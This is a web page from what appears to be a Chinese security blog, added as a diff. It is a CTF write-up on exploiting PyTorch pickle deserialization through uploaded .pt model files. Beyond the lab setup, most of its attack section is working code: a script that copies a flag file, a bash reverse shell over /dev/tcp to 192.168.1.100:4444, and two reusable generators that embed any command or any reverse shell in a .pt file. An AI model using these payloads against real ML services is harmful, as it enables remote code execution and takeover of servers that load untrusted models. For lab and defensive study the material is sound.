@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Persuade_ML_CTF_Challenge — Pickle 反序列化 - 信息安全实验室</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@400;500;700&family=Albert+Sans:wght@400;500;600&display=swap" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@400;500;700&family=Albert+Sans:wght@400;500;600&display=swap"></noscript>
+<link rel="stylesheet" href="../assets/style.css" media="print" onload="this.media='all'">
+<noscript><link rel="stylesheet" href="../assets/style.css"></noscript>
+</head>
+<body>
+<div class="mk-scanline"></div>
+<div class="mk-container">
+
+<div class="mk-brand fade-up">
+  <span class="mk-mark"></span>
+  <span class="mk-wordmark">// HIMOBRINE</span>
+</div>
+
+<div id="mkNavSentinel"></div>
+
+<div class="mk-nav-wrap" id="mkNavWrap">
+  <nav class="mk-nav">
+    <a href="../index.html" class="mk-nav-link">首页</a>
+    <a href="../tags/list.html?tag=漏洞分析" class="mk-nav-link">漏洞分析</a>
+    <a href="../tags/list.html?tag=安全工具" class="mk-nav-link">安全工具</a>
+    <a href="../tags/list.html?tag=学习笔记" class="mk-nav-link">学习笔记</a>
+    <a href="../tags/list.html?tag=逆向" class="mk-nav-link">逆向</a>
+    <a href="../tags/list.html?tag=调试" class="mk-nav-link">调试</a>
+    <a href="../tags/list.html" class="mk-nav-link">标签归档</a>
+  </nav>
+</div>
+
+<a href="../index.html" class="mk-back-link">[ &larr; ] BACK TO HOME</a>
+
+<article class="mk-bento-tile">
+  <div class="mk-post-date">2026 // 06 / 20</div>
+  <div class="mk-post-title">Persuade_ML_CTF_Challenge — Pickle 反序列化</div>
+  <div class="mk-post-tags">
+    <a href="../tags/list.html?tag=AI%E5%AE%89%E5%85%A8" class="mk-tag" style="background:#00d4ff22;color:#00d4ff;border:1px solid #00d4ff44">AI安全</a>
+    <a href="../tags/list.html?tag=CTF" class="mk-tag" style="background:#e4405f22;color:#e4405f;border:1px solid #e4405f44">CTF</a>
+  </div>
+
+  <div class="mk-post-content">
+
+    <nav class="mk-toc">
+      <span class="mk-toc-title">// 目录</span>
+      <ul>
+        <li class="toc-h4"><a href="#setup">搭建环境</a></li>
+        <li class="toc-h4"><a href="#pickle">PyTorch Pickle 反序列化漏洞原理</a></li>
+        <li class="toc-h4"><a href="#exploit">生成 exploit.pt 读取 flag</a></li>
+        <li class="toc-h4"><a href="#shell">生成 shell_exploit.pt 反弹 shell</a></li>
+        <li class="toc-h4"><a href="#tool1">malicious_pt_generator.py 工具</a></li>
+        <li class="toc-h4"><a href="#tool2">reverse_shell_generator.py 工具</a></li>
+      </ul>
+    </nav>
+
+    <p>Persuade_ML_CTF_Challenge 是一个利用 PyTorch Pickle 反序列化漏洞的 CTF 挑战。当用户上传恶意的 .pt 文件到平台时，服务端在加载模型时触发 pickle.loads()，导致任意代码执行。</p>
+
+    <h4 id="setup">搭建环境</h4>
+    <p>使用以下 Dockerfile 构建镜像（已替换为阿里云镜像加速）：</p>
+    <div class="mk-code-wrap">
+      <div class="mk-code-header">
+        <span class="mk-code-info">Dockerfile</span>
+      </div>
+      <pre><code>FROM python:3.8-slim
+
+WORKDIR /app
+
+RUN apt-get update && apt-get install -y --no-install-recommends ca-certificates && \
+    rm -rf /var/lib/apt/lists/*
+
+COPY requirements.txt .
+
+RUN pip install --no-cache-dir --trusted-host mirrors.aliyun.com \
+    -i http://mirrors.aliyun.com/pypi/simple/ -r requirements.txt
+
+COPY app.py /app/
+COPY templates/ /app/templates/
+
+ENV FLASK_APP=app.py
+
+EXPOSE 5000
+
+ENTRYPOINT ["python", "app.py"]
+
+CMD ["--host", "0.0.0.0"]</code></pre>
+    </div>
+    <div class="mk-code-wrap">
+      <div class="mk-code-header">
+        <span class="mk-code-info">bash</span>
+      </div>
+      <pre><code>docker build -t persuade_ml_ctf_challenge . && docker run -d -p 5000:5000 --name persuade_ml_ctf_challenge persuade_ml_ctf_challenge</code></pre>
+    </div>
+
+    <p><picture><source srcset="../assets/persuade_image001.webp" type="image/webp"><img src="../assets/persuade_image001.png" alt="Docker 构建成功" loading="lazy"></picture></p>
+
+    <p>容器运行后，需要手动创建 uploads 目录：</p>
+    <div class="mk-code-wrap">
+      <div class="mk-code-header">
+        <span class="mk-code-info">bash</span>
+      </div>
+      <pre><code>docker exec persuade_ml_ctf_challenge mkdir -p /app/uploads</code></pre>
+    </div>
+
+    <p><picture><source srcset="../assets/persuade_image002.webp" type="image/webp"><img src="../assets/persuade_image002.png" alt="上传界面" loading="lazy"></picture></p>
+
+    <h4 id="pickle">PyTorch Pickle 反序列化漏洞原理</h4>
+    <p>PyTorch 的 torch.load() 底层使用 Python 的 pickle.loads() 进行反序列化。如果加载不可信的 .pt / .pth 文件，攻击者可以在 pickle 数据流中嵌入任意 Python 代码，在反序列化时自动执行。</p>
+    <p>Python 的 pickle 序列化不是单纯的数据序列化，它允许通过 __reduce__ 方法指定反序列化时调用的函数和参数。攻击者可以构造一个包含恶意 __reduce__ 的类，当 pickle.loads() 执行时就会触发目标函数。</p>
+
+    <p><picture><source srcset="../assets/persuade_image003.webp" type="image/webp"><img src="../assets/persuade_image003.png" alt="Pickle 漏洞原理" loading="lazy"></picture></p>
+
+    <h4 id="exploit">生成 exploit.pt 读取 flag</h4>
+    <p>以下脚本生成一个恶意 .pt 文件，在服务端加载时会读取 /app/flag.txt 并写入到 /app/uploads/output.txt：</p>
+    <div class="mk-code-wrap">
+      <div class="mk-code-header">
+        <span class="mk-code-info">gen_exploit.py</span>
+      </div>
+      <pre><code>import pickle
+import torch
+
+class Exploit(object):
+    def __reduce__(self):
+        import os
+        cmd = "cp /app/flag.txt /app/uploads/output.txt"
+        return (os.system, (cmd,))
+
+payload = pickle.dumps(Exploit())
+with open("exploit.pt", "wb") as f:
+    f.write(payload)</code></pre>
+    </div>
+    <div class="mk-code-wrap">
+      <div class="mk-code-header">
+        <span class="mk-code-info">bash</span>
+      </div>
+      <pre><code>python gen_exploit.py</code></pre>
+    </div>
+
+    <p><picture><source srcset="../assets/persuade_image004.webp" type="image/webp"><img src="../assets/persuade_image004.png" alt="生成 exploit.pt" loading="lazy"></picture></p>
+
+    <p>将 exploit.pt 通过平台的上传功能提交：</p>
+    <p><picture><source srcset="../assets/persuade_image005.webp" type="image/webp"><img src="../assets/persuade_image005.png" alt="上传 exploit.pt" loading="lazy"></picture></p>
+    <p><picture><source srcset="../assets/persuade_image006.webp" type="image/webp"><img src="../assets/persuade_image006.png" alt="读取 flag" loading="lazy"></picture></p>
+
+    <h4 id="shell">生成 shell_exploit.pt 反弹 shell</h4>
+    <p>除了读取文件，还可以生成反弹 shell 的恶意 .pt 文件：</p>
+    <div class="mk-code-wrap">
+      <div class="mk-code-header">
+        <span class="mk-code-info">gen_shell.py</span>
+      </div>
+      <pre><code>import pickle
+import torch
+
+class Exploit(object):
+    def __reduce__(self):
+        import os
+        cmd = "bash -c 'exec bash -i &>/dev/tcp/192.168.1.100/4444 <&1'"
+        return (os.system, (cmd,))
+
+payload = pickle.dumps(Exploit())
+with open("shell_exploit.pt", "wb") as f:
+    f.write(payload)</code></pre>
+    </div>
+
+    <p><picture><source srcset="../assets/persuade_image007.webp" type="image/webp"><img src="../assets/persuade_image007.png" alt="反弹 shell 结果" loading="lazy"></picture></p>
+
+    <h4 id="tool1">malicious_pt_generator.py 工具</h4>
+    <p>这是一个更完善的恶意 .pt 生成工具，支持自定义命令：</p>
+    <div class="mk-code-wrap">
+      <div class="mk-code-header">
+        <span class="mk-code-info">malicious_pt_generator.py</span>
+      </div>
+      <pre><code>import argparse
+import pickle
+import os
+
+class MaliciousPayload(object):
+    def __reduce__(self):
+        return (os.system, (self.cmd,))
+
+def generate_pt(cmd, output):
+    MaliciousPayload.cmd = cmd
+    payload = pickle.dumps(MaliciousPayload())
+    with open(output, "wb") as f:
+        f.write(payload)
+    print(f"[+] Generated {output} with command: {cmd}")
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description="malicious .pt generator")
+    parser.add_argument("-c", "--cmd", required=True, help="command to execute")
+    parser.add_argument("-o", "--output", default="exploit.pt", help="output filename")
+    args = parser.parse_args()
+    generate_pt(args.cmd, args.output)</code></pre>
+    </div>
+    <div class="mk-code-wrap">
+      <div class="mk-code-header">
+        <span class="mk-code-info">bash</span>
+      </div>
+      <pre><code>python malicious_pt_generator.py -c "cat /app/flag.txt > /app/uploads/flag.txt" -o myexploit.pt</code></pre>
+    </div>
+
+    <p><picture><source srcset="../assets/persuade_image008.webp" type="image/webp"><img src="../assets/persuade_image008.png" alt="工具运行结果" loading="lazy"></picture></p>
+    <p><picture><source srcset="../assets/persuade_image009.webp" type="image/webp"><img src="../assets/persuade_image009.png" alt="上传结果" loading="lazy"></picture></p>
+
+    <h4 id="tool2">reverse_shell_generator.py 工具</h4>
+    <p>专门用于生成反弹 shell 的 .pt 文件生成器，支持指定 IP 和端口：</p>
+    <div class="mk-code-wrap">
+      <div class="mk-code-header">
+        <span class="mk-code-info">reverse_shell_generator.py</span>
+      </div>
+      <pre><code>import argparse
+import pickle
+import os
+
+class ReverseShell(object):
+    def __reduce__(self):
+        return (os.system, (self.cmd,))
+
+def generate_shell(ip, port, output):
+    ReverseShell.cmd = f"bash -c 'exec bash -i &>/dev/tcp/{ip}/{port} <&1'"
+    payload = pickle.dumps(ReverseShell())
+    with open(output, "wb") as f:
+        f.write(payload)
+    print(f"[+] Generated reverse shell .pt: {output}")
+    print(f"[+] Connect to {ip}:{port} to receive shell")
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description="reverse shell .pt generator")
+    parser.add_argument("--ip", required=True, help="LHOST")
+    parser.add_argument("--port", required=True, help="LPORT")
+    parser.add_argument("-o", "--output", default="shell_exploit.pt")
+    args = parser.parse_args()
+    generate_shell(args.ip, args.port, args.output)</code></pre>
+    </div>
+    <div class="mk-code-wrap">
+      <div class="mk-code-header">
+        <span class="mk-code-info">bash</span>
+      </div>
+      <pre><code>python reverse_shell_generator.py --ip 192.168.1.100 --port 4444 -o shell.pt</code></pre>
+    </div>
+
+    <p><picture><source srcset="../assets/persuade_image010.webp" type="image/webp"><img src="../assets/persuade_image010.png" alt="shell 工具结果 1" loading="lazy"></picture></p>
+    <p><picture><source srcset="../assets/persuade_image011.webp" type="image/webp"><img src="../assets/persuade_image011.png" alt="shell 工具结果 2" loading="lazy"></picture></p>
+    <p><picture><source srcset="../assets/persuade_image012.webp" type="image/webp"><img src="../assets/persuade_image012.png" alt="shell 工具结果 3" loading="lazy"></picture></p>
+    <p><picture><source srcset="../assets/persuade_image013.webp" type="image/webp"><img src="../assets/persuade_image013.png" alt="shell 工具结果 4" loading="lazy"></picture></p>
+
+  </div>
+</article>
+
+<footer class="mk-footer">
+  <div class="mk-footer-brand">RHODES ISLAND <span>://</span> SECURITY LAB <span>//</span> BLOG <span>//</span> REV 3.0</div>
+  <div class="mk-footer-motto">&gt; 道可道，非常道，名可名，非常名</div>
+  <div class="mk-footer-links">
+    <a href="https://github.com/himobrine/wiki">GitHub</a>
+    <a href="../links.html">友情链接</a>
+  </div>
+  <div class="mk-footer-copy">(c) 2026 // SECURITY BLOG</div></footer>
+
+<div class="mk-graph-sidebar" id="mkGraphSidebar">
+  <div class="mk-graph-title"><a href="../graph.html">// 关系图谱</a></div>
+  <div id="graphContainer"></div>
+</div>
+
+<div class="mk-themedock" id="mkThemeDock">
+  <span class="mk-themedock-item active" data-theme="black">■</span>
+  <span class="mk-themedock-item" data-theme="white">□</span>
+  <span class="mk-themedock-item" data-theme="elysia">◇</span>
+  <span class="mk-themedock-item" data-theme="rei">▽</span>
+</div>
+
+<div class="mk-float-buttons">
+  <button class="mk-float-btn" id="mkThemeToggle" title="切换主题" aria-label="切换主题">■</button>
+  <button class="mk-float-btn" id="mkBackToTop" title="回到顶部" aria-label="回到顶部">⌃</button>
+</div>
+
+<script>
+(function(){
+var gs=document.getElementById("mkGraphSidebar"),gc=document.getElementById("graphContainer");
+if(!gs||!gc)return;
+var s=document.createElement("script");
+s.src="../assets/vis-network.min.js";
+s.onload=function(){
+  var d=document.createElement("script");
+  d.src="../assets/posts-data.js";
+  d.onload=function(){
+    var p=document.createElement("script");
+    p.textContent="const POSTS=POSTS_DATA.map(function(p){return{title:p.title,date:p.date,url:p.url.replace(\"posts/\",\"\"),excerpt:p.excerpt,tags:p.tags,primary:p.primary,secondary:p.secondary};});";
+    document.body.appendChild(p);
+    var g=document.createElement("script");
+    g.src="../assets/graph.js";
+    document.body.appendChild(g);
+  };
+  document.body.appendChild(d);
+};
+document.body.appendChild(s);
+})();
+</script>
+
+<script>
+const tocLinks = document.querySelectorAll('.mk-toc a');
+const tocTargets = [];
+tocLinks.forEach(a => {
+  const id = a.getAttribute('href').slice(1);
+  const el = document.getElementById(id);
+  if (el) tocTargets.push({ el, link: a });
+});
+const tocObs = new IntersectionObserver(
+  (entries) => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        tocLinks.forEach(a => a.classList.remove('active'));
+        const match = tocTargets.find(t => t.el === e.target);
+        if (match) match.link.classList.add('active');
+      }
+    });
+  },
+  { threshold: 0.3, rootMargin: '-80px 0px -40% 0px' }
+);
+tocTargets.forEach(t => tocObs.observe(t.el));
+</script>
+
+<script src="../assets/common.js"></script></body>
+</html>
